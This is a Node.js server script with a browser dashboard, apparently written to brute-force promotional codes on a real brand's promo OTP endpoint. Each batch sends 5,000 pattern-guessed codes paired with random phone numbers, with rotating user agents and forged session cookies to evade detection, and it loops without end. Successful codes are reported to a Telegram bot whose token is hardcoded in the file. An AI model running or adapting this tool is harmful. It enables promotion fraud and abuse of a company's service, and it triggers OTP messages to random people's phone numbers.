const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const axios = require('axios');

// ═══════════════════════════════════════════════════════════════
//                    CONFIGURATION
// ═══════════════════════════════════════════════════════════════

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = "8468676540:AAFsb4SPSlAD-5dNUmbQARL5Sj9cXlO7Oac";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ═══════════════════════════════════════════════════════════════
//                    SMART BRUTEFORCER CLASS
// ═══════════════════════════════════════════════════════════════

class SmartBruteforcer {
    constructor(ws) {
        this.ws = ws;
        this.chatId = null;
        this.successCodes = new Set();
        this.totalAttempts = 0;
        this.batchNum = 0;
        this.isRunning = false;
        
        // WORKING CODES FOR PATTERN ANALYSIS
        this.workingCodes = ["MTWCDY", "MY6BKC", "TPHV6T", "TH6HXF", "THBK38"];
        this.codePatterns = this.analyzeWorkingCodes();
        
        // TICTAC CONFIG
        this.baseUrl = "https://www.tictac.com";
        this.endpoint = "/in/en/xp/jarpecarpromo/home/generateOTP";
        
        // USER AGENTS
        this.userAgents = [
            'Mozilla/5.0 (Linux; Android 15; V2315) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.34 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36'
        ];
        
        this.initTelegram();
    }
    
    // ═══════════════════════════════════════════════════════════
    //              TELEGRAM INITIALIZATION
    // ═══════════════════════════════════════════════════════════
    
    async initTelegram() {
        try {
            const response = await axios.get(`${TELEGRAM_API}/getUpdates`, { timeout: 30000 });
            if (response.data.result && response.data.result.length > 0) {
                this.chatId = response.data.result[response.data.result.length - 1].message.chat.id;
            }
        } catch (error) {
            this.chatId = null;
        }
    }
    
    // ═══════════════════════════════════════════════════════════
    //              PATTERN ANALYSIS
    // ═══════════════════════════════════════════════════════════
    
    analyzeWorkingCodes() {
        const patterns = {
            positionPatterns: {},
            charFrequencies: {},
            structurePatterns: [],
            prefixSuffix: { prefix: {}, suffix: {} }
        };
        
        // POSITION ANALYSIS
        for (let position = 0; position < 6; position++) {
            const charsAtPos = this.workingCodes.map(code => code[position]);
            patterns.positionPatterns[position] = {
                letters: charsAtPos.filter(c => /[A-Z]/.test(c)),
                digits: charsAtPos.filter(c => /[0-9]/.test(c)),
                common: [...new Set(charsAtPos)]
            };
        }
        
        // CHARACTER FREQUENCY
        const allChars = this.workingCodes.join('');
        for (const char of new Set(allChars)) {
            patterns.charFrequencies[char] = (allChars.match(new RegExp(char, 'g')) || []).length;
        }
        
        // STRUCTURE PATTERNS
        for (const code of this.workingCodes) {
            const structure = code.split('').map(c => /[A-Z]/.test(c) ? 'L' : 'D').join('');
            patterns.structurePatterns.push(structure);
        }
        
        // PREFIX/SUFFIX
        for (const code of this.workingCodes) {
            const prefix = code.slice(0, 2);
            const suffix = code.slice(-2);
            patterns.prefixSuffix.prefix[prefix] = (patterns.prefixSuffix.prefix[prefix] || 0) + 1;
            patterns.prefixSuffix.suffix[suffix] = (patterns.prefixSuffix.suffix[suffix] || 0) + 1;
        }
        
        return patterns;
    }
    
    // ═══════════════════════════════════════════════════════════
    //              SMART CODE GENERATION
    // ═══════════════════════════════════════════════════════════
    
    generateSmartCodes(count = 5000) {
        const codes = new Set(this.workingCodes);
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        
        // STRUCTURE-BASED GENERATION
        const structures = [...new Set(this.codePatterns.structurePatterns)];
        for (let i = 0; i < count * 0.3; i++) {
            const struct = structures[Math.floor(Math.random() * structures.length)];
            let code = '';
            for (const patternChar of struct) {
                if (patternChar === 'L') {
                    code += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random() * 26)];
                } else {
                    code += Math.floor(Math.random() * 10);
                }
            }
            codes.add(code);
        }
        
        // POSITION-SPECIFIC GENERATION
        for (let i = 0; i < count * 0.3; i++) {
            let code = '';
            for (let pos = 0; pos < 6; pos++) {
                const posData = this.codePatterns.positionPatterns[pos];
                const available = [...posData.letters, ...posData.digits];
                code += available.length > 0 
                    ? available[Math.floor(Math.random() * available.length)]
                    : chars[Math.floor(Math.random() * chars.length)];
            }
            codes.add(code);
        }
        
        // PREFIX/SUFFIX BASED
        const prefixes = Object.keys(this.codePatterns.prefixSuffix.prefix);
        const suffixes = Object.keys(this.codePatterns.prefixSuffix.suffix);
        
        for (let i = 0; i < count * 0.2; i++) {
            const prefix = prefixes[Math.floor(Math.random() * prefixes.length)] || 
                          chars.slice(0, 2);
            const suffix = suffixes[Math.floor(Math.random() * suffixes.length)] || 
                          chars.slice(-2);
            const middle = Array(2).fill(0).map(() => 
                chars[Math.floor(Math.random() * chars.length)]
            ).join('');
            codes.add(prefix + middle + suffix);
        }
        
        // RANDOM FILL
        while (codes.size < count) {
            const code = Array(6).fill(0).map(() => 
                chars[Math.floor(Math.random() * chars.length)]
            ).join('');
            codes.add(code);
        }
        
        return Array.from(codes).slice(0, count);
    }
    
    // ═══════════════════════════════════════════════════════════
    //              PHONE GENERATION
    // ═══════════════════════════════════════════════════════════
    
    generateRandomPhone() {
        const prefix = ['7', '8', '9', '6'][Math.floor(Math.random() * 4)];
        const remaining = Array(9).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
        return prefix + remaining;
    }
    
    // ═══════════════════════════════════════════════════════════
    //              REQUEST MAKER
    // ═══════════════════════════════════════════════════════════
    
    async makeRequest(code, phone) {
        const url = `${this.baseUrl}${this.endpoint}`;
        const headers = {
            'Host': 'www.tictac.com',
            'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)],
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'origin': 'https://www.tictac.com',
            'referer': 'https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/',
            'cookie': `PHPSESSID=1vs284nnha0gcc89i53i3oo${Math.floor(Math.random() * 900) + 100}`
        };
        
        try {
            const response = await axios.post(url, 
                `phone=${phone}&ccode=${code}`,
                { headers, timeout: 5000 }
            );
            
            this.totalAttempts++;
            
            if (response.status === 200) {
                const data = response.data;
                const isSuccess = JSON.stringify(data).toLowerCase().includes('success');
                
                if (isSuccess) {
                    this.successCodes.add(code);
                    return { code, phone, status: 'success', response: data };
                } else {
                    return { code, phone, status: 'failed', response: data };
                }
            }
        } catch (error) {
            return { code, phone, status: 'error', error: error.message };
        }
        
        return null;
    }
    
    // ═══════════════════════════════════════════════════════════
    //              TELEGRAM NOTIFICATION
    // ═══════════════════════════════════════════════════════════
    
    async sendSuccessToTelegram(code, phone) {
        if (!this.chatId) return false;
        
        const message = `
🎯 <b>SUCCESS CODE FOUND!</b>

🔑 <b>Code:</b> <code>${code}</code>
📱 <b>Phone:</b> <code>${phone}</code>
⏰ <b>Time:</b> ${new Date().toLocaleTimeString()}
📊 <b>Total Success:</b> ${this.successCodes.size} codes
        `.trim();
        
        try {
            await axios.post(`${TELEGRAM_API}/sendMessage`, {
                chat_id: this.chatId,
                text: message,
                parse_mode: 'HTML'
            }, { timeout: 15000 });
            return true;
        } catch (error) {
            return false;
        }
    }
    
    // ═══════════════════════════════════════════════════════════
    //              WEBSOCKET SENDER
    // ═══════════════════════════════════════════════════════════
    
    sendWS(data) {
        if (this.ws && this.ws.readyState === WebSocket.OPEN) {
            this.ws.send(JSON.stringify(data));
        }
    }
    
    // ═══════════════════════════════════════════════════════════
    //              BATCH EXECUTION
    // ═══════════════════════════════════════════════════════════
    
    async executeBatch() {
        this.batchNum++;
        const startTime = Date.now();
        
        this.sendWS({
            type: 'batch_start',
            batch: this.batchNum,
            message: `🧠 SMART BATCH #${this.batchNum} STARTED`
        });
        
        // GENERATE CODES
        const codes = this.generateSmartCodes(5000);
        const phones = Array(5000).fill(0).map(() => this.generateRandomPhone());
        
        this.sendWS({
            type: 'codes_generated',
            count: codes.length,
            message: `✅ Generated ${codes.length} smart pattern-based codes`
        });
        
        // EXECUTE REQUESTS
        let completed = 0;
        let successCount = 0;
        const batchSize = 100;
        
        for (let i = 0; i < codes.length; i += batchSize) {
            const batch = codes.slice(i, i + batchSize);
            const phoneBatch = phones.slice(i, i + batchSize);
            
            const promises = batch.map((code, idx) => 
                this.makeRequest(code, phoneBatch[idx])
            );
            
            const results = await Promise.allSettled(promises);
            
            for (const result of results) {
                if (result.status === 'fulfilled' && result.value) {
                    completed++;
                    
                    if (result.value.status === 'success') {
                        successCount++;
                        
                        // SEND SUCCESS TO WEBSOCKET
                        this.sendWS({
                            type: 'success',
                            code: result.value.code,
                            phone: result.value.phone,
                            successCount,
                            message: `🎯 SUCCESS #${successCount}: ${result.value.code}`
                        });
                        
                        // SEND TO TELEGRAM
                        this.sendSuccessToTelegram(result.value.code, result.value.phone);
                    }
                    
                    // PROGRESS UPDATE
                    if (completed % 500 === 0) {
                        this.sendWS({
                            type: 'progress',
                            completed,
                            total: 5000,
                            successCount,
                            message: `📊 Progress: ${completed}/5000 | Success: ${successCount}`
                        });
                    }
                }
            }
        }
        
        // BATCH COMPLETE
        const timeTaken = ((Date.now() - startTime) / 1000).toFixed(2);
        
        this.sendWS({
            type: 'batch_complete',
            batch: this.batchNum,
            successCount,
            timeTaken,
            totalSuccess: this.successCodes.size,
            allCodes: Array.from(this.successCodes),
            message: `✅ Batch #${this.batchNum} complete: ${successCount} successes in ${timeTaken}s`
        });
    }
    
    // ═══════════════════════════════════════════════════════════
    //              INFINITE MODE
    // ═══════════════════════════════════════════════════════════
    
    async runInfinite() {
        this.isRunning = true;
        
        this.sendWS({
            type: 'mode_start',
            message: '🔮 INFINITE SMART MODE ACTIVATED'
        });
        
        while (this.isRunning) {
            await this.executeBatch();
            
            this.sendWS({
                type: 'cooldown',
                message: '⏰ 15 second cooldown...'
            });
            
            await new Promise(resolve => setTimeout(resolve, 15000));
        }
    }
    
    stop() {
        this.isRunning = false;
        this.sendWS({
            type: 'stopped',
            message: '🛑 Bruteforce stopped'
        });
    }
}

// ═══════════════════════════════════════════════════════════════
//                    EXPRESS + WEBSOCKET SERVER
// ═══════════════════════════════════════════════════════════════

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// SERVE HTML PAGE
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🧠 Smart Bruteforcer - Real-time</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 30px;
            backdrop-filter: blur(10px);
        }
        h1 {
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 30px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .controls {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-bottom: 30px;
        }
        button {
            padding: 15px 30px;
            font-size: 1.1em;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn-start {
            background: #10b981;
            color: white;
        }
        .btn-start:hover { background: #059669; transform: scale(1.05); }
        .btn-stop {
            background: #ef4444;
            color: white;
        }
        .btn-stop:hover { background: #dc2626; transform: scale(1.05); }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #10b981;
        }
        .stat-label {
            font-size: 0.9em;
            opacity: 0.8;
            margin-top: 5px;
        }
        .log-container {
            background: rgba(0,0,0,0.5);
            border-radius: 10px;
            padding: 20px;
            height: 500px;
            overflow-y: auto;
        }
        .log-entry {
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            background: rgba(255,255,255,0.05);
            animation: fadeIn 0.3s;
        }
        .log-success {
            background: rgba(16, 185, 129, 0.2);
            border-left: 4px solid #10b981;
        }
        .log-info {
            background: rgba(59, 130, 246, 0.2);
            border-left: 4px solid #3b82f6;
        }
        .log-error {
            background: rgba(239, 68, 68, 0.2);
            border-left: 4px solid #ef4444;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .success-codes {
            margin-top: 20px;
            padding: 15px;
            background: rgba(16, 185, 129, 0.1);
            border-radius: 10px;
        }
        .code-item {
            display: inline-block;
            padding: 8px 15px;
            margin: 5px;
            background: rgba(16, 185, 129, 0.3);
            border-radius: 5px;
            font-weight: bold;
        }
        .status {
            text-align: center;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 1.2em;
            font-weight: bold;
        }
        .status-connected {
            background: rgba(16, 185, 129, 0.2);
            color: #10b981;
        }
        .status-disconnected {
            background: rgba(239, 68, 68, 0.2);
            color: #ef4444;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🧠 SMART BRUTEFORCER</h1>
        
        <div id="status" class="status status-disconnected">
            ⚠️ Connecting to WebSocket...
        </div>
        
        <div class="controls">
            <button class="btn-start" onclick="startInfinite()">🚀 Start Infinite Mode</button>
            <button class="btn-stop" onclick="stop()">🛑 Stop</button>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="batchNum">0</div>
                <div class="stat-label">Batch Number</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="successCount">0</div>
                <div class="stat-label">Success Codes</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="progress">0%</div>
                <div class="stat-label">Progress</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalSuccess">0</div>
                <div class="stat-label">Total Success</div>
            </div>
        </div>
        
        <div class="success-codes">
            <h3>🎯 Working Codes:</h3>
            <div id="successCodes"></div>
        </div>
        
        <div class="log-container" id="logs"></div>
    </div>
    
    <script>
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const ws = new WebSocket(protocol + '//' + window.location.host);
        
        ws.onopen = () => {
            document.getElementById('status').className = 'status status-connected';
            document.getElementById('status').innerHTML = '✅ Connected to WebSocket Server';
            addLog('🟢 WebSocket connected', 'info');
        };
        
        ws.onclose = () => {
            document.getElementById('status').className = 'status status-disconnected';
            document.getElementById('status').innerHTML = '🔴 Disconnected from Server';
            addLog('🔴 WebSocket disconnected', 'error');
        };
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleMessage(data);
        };
        
        function handleMessage(data) {
            switch(data.type) {
                case 'batch_start':
                    document.getElementById('batchNum').textContent = data.batch;
                    addLog(data.message, 'info');
                    break;
                    
                case 'codes_generated':
                    addLog(data.message, 'info');
                    break;
                    
                case 'success':
                    document.getElementById('successCount').textContent = data.successCount;
                    addLog(data.message, 'success');
                    addSuccessCode(data.code);
                    break;
                    
                case 'progress':
                    const percent = ((data.completed / data.total) * 100).toFixed(1);
                    document.getElementById('progress').textContent = percent + '%';
                    addLog(data.message, 'info');
                    break;
                    
                case 'batch_complete':
                    document.getElementById('totalSuccess').textContent = data.totalSuccess;
                    addLog(data.message, 'success');
                    break;
                    
                case 'cooldown':
                case 'mode_start':
                case 'stopped':
                    addLog(data.message, 'info');
                    break;
            }
        }
        
        function addLog(message, type = 'info') {
            const logs = document.getElementById('logs');
            const entry = document.createElement('div');
            entry.className = 'log-entry log-' + type;
            entry.innerHTML = \`[\${new Date().toLocaleTimeString()}] \${message}\`;
            logs.insertBefore(entry, logs.firstChild);
            
            while(logs.children.length > 100) {
                logs.removeChild(logs.lastChild);
            }
        }
        
        function addSuccessCode(code) {
            const container = document.getElementById('successCodes');
            const codeItem = document.createElement('span');
            codeItem.className = 'code-item';
            codeItem.textContent = code;
            container.insertBefore(codeItem, container.firstChild);
        }
        
        function startInfinite() {
            ws.send(JSON.stringify({ command: 'start_infinite' }));
            addLog('🚀 Starting infinite mode...', 'info');
        }
        
        function stop() {
            ws.send(JSON.stringify({ command: 'stop' }));
            addLog('🛑 Stopping...', 'info');
        }
    </script>
</body>
</html>
    `);
});

// WEBSOCKET CONNECTION HANDLER
wss.on('connection', (ws) => {
    console.log('✅ New WebSocket client connected');
    
    let bruteforcer = null;
    
    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);
            
            if (data.command === 'start_infinite') {
                if (!bruteforcer) {
                    bruteforcer = new SmartBruteforcer(ws);
                }
                bruteforcer.runInfinite();
            } else if (data.command === 'stop') {
                if (bruteforcer) {
                    bruteforcer.stop();
                }
            }
        } catch (error) {
            console.error('❌ Error:', error.message);
        }
    });
    
    ws.on('close', () => {
        console.log('❌ Client disconnected');
        if (bruteforcer) {
            bruteforcer.stop();
        }
    });
});

// START SERVER
server.listen(PORT, () => {
    console.log(`
╔════════════════════════════════════════════════════════════════╗
║          🚀 SMART BRUTEFORCER SERVER RUNNING                  ║
║                                                                ║
║  🌐 Server: http://localhost:${PORT}                            ║
║  🔌 WebSocket: Ready                                          ║
║  🧠 Smart Pattern Analysis: ACTIVE                            ║
║  📊 Real-time Updates: ENABLED                                ║
║  ☁️  Render.com: READY                                         ║
╚════════════════════════════════════════════════════════════════╝
    `);
});
